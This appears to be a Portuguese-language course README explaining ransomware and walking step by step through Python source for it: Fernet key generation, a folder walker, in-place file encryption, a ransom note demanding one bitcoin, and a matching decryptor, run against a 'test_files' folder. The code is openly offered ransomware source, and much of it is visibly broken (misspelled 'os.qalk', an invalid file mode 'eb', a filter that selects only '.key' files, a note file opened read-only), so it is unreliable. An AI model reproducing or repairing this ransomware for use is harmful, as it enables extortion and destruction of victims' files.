# Dio-ransomware-e-keyloog

# RansomWare
______
O que e ransomware?

O que e ransomware e um tipo de software malicioso(malware) onde o intuito dele e capturar arquivos e criptografa-lo "com uma senha extremamente forte" , onde a vitima vai ser estorquida e o atacante vai forca-lo a pagar uma certa quantia e se nao pagar vai ter seus dados vazados, e em muitos casos a vitima ate paga para que o atacante devolva e o atacante some com os dados e o dinheiro.

Como funciona o processo do ataque?

1- Precisamos encontrar o arquivo alvo
2- Criptografa este arquivo com uma chave que somente o atacante vai ter acesso. Logo em seguida o alvo vai ter perdido o acesso sobre o arquivo.
3- Deixar uma mensagem dizendo Orientando o que deve ser feito para que tenha o acesso novamente sobre o arquivo furtado.

Como fazer um arquivo Ransomware.

Primeiro precisa-mos ter a biblioteca do cryptography.fernet e a Fernet intalada no seu IDEs.
feito isto iremos comecar.

from cryptography.fernet import Fernet
import os

A biblioteca Cryptography: e a responsavel por fazer a criptografia.
Import os : e a responsavel por navegar nos arquivos da vitima.

1- Este primaria linha de comando e a responsavel por salva a chave da criptografia:

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

2- Esta e a responsavel pela funcao de carregar a chave salva do arquivo:

def carregar_chave():\
    return open("chave.key", "rb").read()

3- Esta e a parte mais importante do script , pois sera a responsavel por, abrir o arquivo principal, ler todos os dados e depois criptografar, com a chave e sobre escrever com os dados criptografado:

def criptografar_arquivo(arquivo, chave):
       f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_encriptados = f.encrypt(dados)
        with open(arquivo, "eb") as file:
            file.write(dados_encriptados)
            
<img width="646" height="415" alt="cripto" src="https://github.com/user-attachments/assets/bb532750-6b2c-444e-a796-6b2daaaac8cf" />
No pc do alvo ele fica desta forma, todo codificado.

4- Esta funcao sera a responsavel por vasculhar os arquivos dentro da pasta da vitima:

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.qalk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and.nome.endswith(".key"):
                lista.append(caminho)
     return lista

5- Aqui e a onde a pessoa entra em desespero, pois este e o comando que manda uma mensagem ao alvo , onde o atacante vai comecar a trabalhar no psicologico do alvo:

def mensagem_resgate():
    with open("LEIA ISTO.txt") as f:
        f.write("seus arquivos foram criptografados")
        f.write("para recuperar seus arquivos, envie 1 bitcoin para o endereco X e envie o comprovante!\n")
        f.write("Depois disso , enviaremos a chave para voce recuperar seus arquivos")

6- Aqui e o cerebro deste script e a funcao principal, onde ele faz as ordenanca da sequencia dos script , para que ele rode sem pular etapas:

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
       mensagem_resgate()
    print("ransoware executado com sucesso!")

  Para finalizar os comandos temos o:

  if __name__ == "__main__":
    main ()

  Este tem a funcao de garantir que se a funcao man for execultada ela vai ser chamada.

  Feito todo este processo iremos execultar o codigo:

  Abra o terminal e digite

  python /ransoware.py

  Depois de execultar todos os arquivos da pasta , o arquivo estara totalmente criptografado e o alvo quando abrir o arquivo, perceberar que o mesmo vai esta todo codificado.

 Descriptografando o arquivo

 Temos que criar uma nova sessao no nosso IDEs, onde a funcao dele sera simples e direta, que e descriptografar o arquivo do alvo.

1- Usaremos a mesma biblioteca para reverter o arquivo:

from cryptography.fernet import Fernet
import os

2- Esta tera a funcao de carregar a chave para descriptografar:

def carregar_chave()
    return open("chave.key", "rb").read()

3-

def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)


def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.qalk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and.nome.endswith(".key"):
                lista.append(caminho)
     return lista


def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for aruivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Descriptografia concluida com sucesso!")

    if __name__ == "__main__":
        main()    

